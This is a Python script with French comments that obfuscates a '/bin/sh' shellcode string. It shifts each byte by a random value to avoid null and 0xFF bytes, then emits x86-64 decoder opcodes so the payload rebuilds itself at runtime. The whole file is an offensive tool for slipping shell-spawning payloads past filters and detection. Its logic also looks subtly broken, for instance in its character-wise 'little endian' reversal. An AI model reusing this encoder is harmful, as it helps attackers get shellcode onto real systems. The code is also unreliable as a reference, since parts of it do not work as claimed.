#! /usr/bin/python

from random import randint as r
import socket
from sys import argv
#Fonction qui va vérifier que la string reçue ne contient aucune valeur hexa 0x00 ou 0xFF
def verifOffus(binBashHexa):
    #Vérifie s'il y a 0x au debut de la string
    if binBashHexa[0]+binBashHexa[1] != "0x" :
        binBashHexa = "0x"+binBashHexa

    #Parcours la string
    for i in range(2,len(binBashHexa),2):
        #Récupère par tranche de deux caractères une sub string
        sub ="0x"+binBashHexa[i] + binBashHexa[i+1]
        numInHex = int(sub,16)

        #Vérifie qu'il n'y ait ni de 0 ni de valeur à 16
        if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
            return False
    return True


def factorOffus(string4Payload):
    #Vérifie que la string ne contient aucune valeur hexa 0x00 ou 0xFF
    if verifOffus(string4Payload) == False:
        return string4Payload

    #Vérifie s'il n'y a pas "0x" au debut de la string, au quel cas on va l'ajouter
    if string4Payload[0]+string4Payload[1] != "0x" :
        string4Payload = "0x"+string4Payload
    
    #Tableau qui va recevoir les possibilités d'offuscation par addition ou soustraction
    arr = []                #tab temporaire
    theOneArr = []          #tab d'accueil réel

    #On définit l'opérateur (1 == '-' ; 2 == '+')
    ope = r(1,2)
   
    #Evalue les 15 possibilités de soustraction/addition par tranche de 2 octets de la string
    for j in range(1,15):
            
        for i in range(2,len(string4Payload),2): #Commence à 2 pour ignorer "0x" dans la chaine

            #On substring par tranche de 2 octet notre string en hexa
            sub ="0x"+string4Payload[i+1]
            numInHex = int(sub,16)
            
            #Soustraction : l'offuscation se fera donc par soustraction (et la désof par addition)
            if ope == 1 :
                tmp = numInHex - j

                #Si le résultat de la sosutraction est différente de 255 (0xFF) ou 0 (0x00), on ajoute à la liste
                if tmp > 0:
                    arr.append(j)
                else:
                    break

            #Addition : l'offuscation se fera donc par addition (et la désof par soustraction)
            if ope == 2 :
                tmp = numInHex + j

                #Si le résultat de l'addition est différente de 255 (0xFF) ou 0 (0x00), on ajoute à la liste
                if tmp < 255 :
                    arr.append(j)
             
                else:
                    break

    #Rend unique chaque valeurs et les ordonne
    arr[:] = list(set(arr)) 

    #On épure du tableau toutes les valeurs que celle de la string ne peuvent pas supporter en ce servant de arr comme 
    # tableau temporaire
    for i in range(2,len(string4Payload),2):
        sub ="0x"+string4Payload[i]+string4Payload[i+1]
        numInDec = int(sub,16)
        
        for j in range(len(arr)) :
            if ope == 1 :
                if (numInDec - arr[j]) > 0 :
                    theOneArr.append(arr[j])

                else:
                    if arr[j] :
                        while arr[j] in theOneArr:
                            del theOneArr[theOneArr.index(arr[j] )]
            
            if ope == 2 :
                if (numInDec + arr[j]) < 255 :
                    theOneArr.append(arr[j])

                else:
                    if arr[j] :
                        while arr[j] in theOneArr:
                            del theOneArr[theOneArr.index(arr[j] )]

    #Ce tableau setted sera notre tableau de référence pour add ou sub une valeur à chaque double octet de notre string(elle, en hexa)
    theOneArr[:]= list(set(theOneArr))

    rand = r(theOneArr[0],theOneArr[-1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur

    #Si l'opérateur été "-", on rend positif la valeur choisie aléatoirement
    if ope == 1 :
         rand = rand * -1

    return rand

#Le "main" de l'offuscation, on va utiliser le retour de la fonction factorOffus 
# et l'additionner à toutes les valeurs par tanches de deux octets de la string d'hexa
def offus(string4Payload, rand):
    #On recinstitue une nouvelle chaine en hexa
    newString = ""

    #Vérifie s'il n'y a pas "0x" au debut de la string
    if string4Payload[0]+string4Payload[1] != "0x" :
        string4Payload = "0x"+string4Payload
    
    #On boucle sur l'addition/soustraction avec notre coefficient pour obtenir notre nouvelle string
    for i in range(2,len(string4Payload),2):

        if string4Payload[i] + string4Payload[i+1] == "0x" :
            continue
        
        else :
            #Récupère la valeur hexa pour l'occurence en cours
            sub = string4Payload[i] + string4Payload[i+1]
            #Ajout la valeur random à la valeur (résultat en décimal)
            numInDec = int(sub,16) + rand
            #Convertit en hexa
            numInHex = hex(numInDec)

            #La fonction hex ecrit 2 en hexa => 0x2 et pas 0x02 donc on vérifie
            if len(str(numInHex)) > 3:
                newString = newString + str(numInHex[-2:])
            else :
                newString = newString + "0" + str(numInHex[-1:])
    
    return newString

#Renvoit l'opcode pour soustraire ou additionnner ce qui rend la désoffuscation possible
def deOffus(factorOffusVar, string_to_deof):
    addString = ""
    #On a add donc on va re sub la différence additionnée
    if factorOffusVar < 0 :
        factorOffusVar *= -1 
        if factorOffusVar < 10 :

            halfLen = int((len(string_to_deof)/2))      #On va créer une string avec un seul caractère comme suit. Ex: 0a0a0a0a0a0a0a
            for i in range(halfLen):
                addString+="0"+str(factorOffusVar)      #Le zéro est ajouté ici donc on aura besoin que de la moitié de la longueur de la string (halfLen)

            addString = "4883eb" + addString
            return addString
        
        elif factorOffusVar >= 10 :
            newFactor = ""
            if factorOffusVar == 10 : newFactor = "a"
            elif factorOffusVar == 11 : newFactor = "b"
            elif factorOffusVar == 12 : newFactor = "c"
            elif factorOffusVar == 13 : newFactor = "d"
            elif factorOffusVar == 14 : newFactor = "e"
            elif factorOffusVar == 15 : newFactor = "f"

            halfLen = int((len(string_to_deof)/2))
            for i in range(halfLen):
                addString+="0"+str(newFactor)

            addString = "4883eb" + addString
            return addString
        
    #On a sub donc on va re add la différence soustraite
    elif factorOffusVar > 0 :
        if factorOffusVar <= 10 :
            
            halfLen = int((len(string_to_deof)/2))
            for i in range(halfLen):
                addString+="0"+str(factorOffusVar)

            addString = "4883c3" + addString
            return addString
        
        elif factorOffusVar > 10 :
            newFactor = ""
            if factorOffusVar == 10 : newFactor = "a"
            elif factorOffusVar == 11 : newFactor = "b"
            elif factorOffusVar == 12 : newFactor = "c"
            elif factorOffusVar == 13 : newFactor = "d"
            elif factorOffusVar == 14 : newFactor = "e"
            elif factorOffusVar == 15 : newFactor = "f"

            halfLen = int((len(string_to_deof)/2))
            for i in range(halfLen):
                addString+="0"+str(newFactor)
                #halfLen-=1

            addString = "4883c3" + addString
            return addString
         
random1 = factorOffus("0x68732f6e69622f2f")
of_string = offus("0x68732f6e69622f2f", random1)
of_string = of_string[::-1] #litle indian
of_string += "48bb"
deof_string = deOffus(random1, of_string)
        
print("FINAL : 0x68732f6e69622f2f", random1, of_string, deof_string)
